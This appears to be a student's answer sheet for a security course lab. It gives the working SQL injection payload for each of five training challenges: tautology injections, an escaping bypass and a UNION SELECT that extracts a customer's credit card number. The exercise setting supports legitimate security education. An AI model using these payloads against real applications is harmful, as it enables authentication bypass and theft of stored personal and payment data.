# Week 2 Lab

1. SQL Injection Challenge: Please enter the user name of the user that you want to look up

                SELECT * FROM tb_users WHERE username ='' OR '1'='1';

2. SQL Injection 1 Challenge: Please enter the Customer Id of the user that you want to look up

                "OR "1"="1

3. SQL Injection 2 Challenge:Please enter the Customer Email of the user that you want to look up
          sqli' OR '1'='1'; -- "@gmail.com

4. SQL Injection Escaping Challenge: To complete this challenge, you must exploit SQL injection flaw in the following form to find the result key. The developer of this level has attempted to stop SQL Injection attacks by escaping apostrophes so the database interpreter will know not to pay attention to user submitted apostrophes.

          \' or 1 = 1; #

5. SQL Injection Challenge 3: To complete this challenge, you must exploit a SQL injection issue in the following sub application to acquire the credit card number from one of the customers that has a customer name of Mary Martin. Mary's credit card number is the result key to this challenge.

          ' Union select creditcardnumber from customers where customername = "Mary Martin"; #
